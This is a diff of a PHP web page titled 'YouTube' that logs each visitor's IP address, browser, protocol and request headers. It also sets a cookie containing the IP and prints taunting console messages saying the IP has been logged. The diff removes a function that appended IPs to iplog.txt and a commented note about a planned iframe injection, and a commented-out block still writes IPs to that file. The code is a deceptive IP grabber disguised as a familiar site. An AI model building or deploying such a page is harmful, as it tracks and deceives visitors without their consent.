@@ -3,7 +3,7 @@ $IP = $_SERVER['REMOTE_ADDR'];
 $proto = $_SERVER['SERVER_PROTOCOL']; 
 $BROWSER = $_SERVER['HTTP_USER_AGENT'];
 echo "<html> <head><title>YouTube</title><meta charset='utf-8'></head>";
-echo "<body background= background.jpg><script>console.log('Your IP has been logged. Enjoy it'); console.log('$BROWSER is your Browser');</script>";
+echo "<body background='https://images.pexels.com/photos/2583852/pexels-photo-2583852.jpeg'><script>console.log('Your IP has been logged. Enjoy it'); console.log('$BROWSER is your Browser');</script>";
 $Time = $_SERVER['REQUEST_TIME'];
 $SOFTWARE = $_SERVER['SERVER_SOFTWARE'];
 $HTTACCEPT = $_SERVER['HTTP_ACCEPT'];
@@ -20,7 +20,7 @@ for ($i = 0; $i <= $fh;$i++){
 fclose($fh);
 echo "<script>console.log( '$IP Is your IP address and your protocol: $proto');</script>";
 function dectorate(){
-  echo "<style>body{background-color:#24CC54; } .host-information{ background-color:#DD646E; } p{font-family: sans-serif; color: lightblue;} pre{color: green;}</style>";
+  echo "<style>body{background-color:#24CC54;} .host-information{ background-color:#DD646E; } p{font-family: sans-serif; color: lightblue;} pre{color: green;}</style>";
   echo "<script></script>";
 }
 dectorate();
@@ -97,7 +97,6 @@ function get_access(){
     }
 
 }
-get_access();
 function gather_emails(){
     $IP = $_SERVER['REMOTE_ADDR'];
     $get_provider_DNS  = checkdnsrr($IP);
@@ -119,35 +118,23 @@ gather_emails();
 function set_ckies(){
     $IP = $_SERVER['REMOTE_ADDR'];
 $wrcokie = setcookie("yo" , "$IP");
-//echo "<script>console.warn($wrcokie);</script>";
+echo "<script>console.warn($wrcokie);</script>";
 echo "<script>console.error('Above are the amount of cookies in your session');</script>";
 }
 set_ckies();
-function redird($uri){
-    try{
-        $HTTACCEPT = $_SERVER['HTTP_ACCEPT'];
-        $img_grabber = @imagecreatefromjpeg("https://resources.altium.com/sites/default/files/blogs/Semiconductor%20Fiber%20Could%20Replace%20Fiber%20Optic%20Cable%20Transmission%20Lines-37745.jpg");
-        //echo "<iframe><script>d = document.location;</script></iframe>"; Update for Iframe Injection
 
-    }
-    catch (Exception $e){
-        $fp = fopen('iplog.txt', 'a');
-fwrite($fp, $ip .'\n');  
-fclose($fp)
-echo "<h1> Your Ipv4 address has been logged no matter how hard you really tried.</h1>";
-    }
-}
 /*header("Content-Type: image/png");
 $ip = $_SERVER['REMOTE_ADDR'];  
 $im = @imagecreate(110, 20)
     or die("Cannot Initialize new GD image stream");
 $background_color = imagecolorallocate($im, 0, 0, 0);
 $text_color = imagecolorallocate($im, 233, 14, 91);
-imagestring($im, 100, 50, 50,  "A example image made in php", $text_color);
+imagestring($im, 1, 5, 5,  "A example image made in php", $text_color);
 imagepng($im);
 imagedestroy($im);
 $fp = fopen('iplog.txt', 'a');
 fwrite($fp, $ip .'\n');  
 fclose($fp);
+
 */ 
 ?>
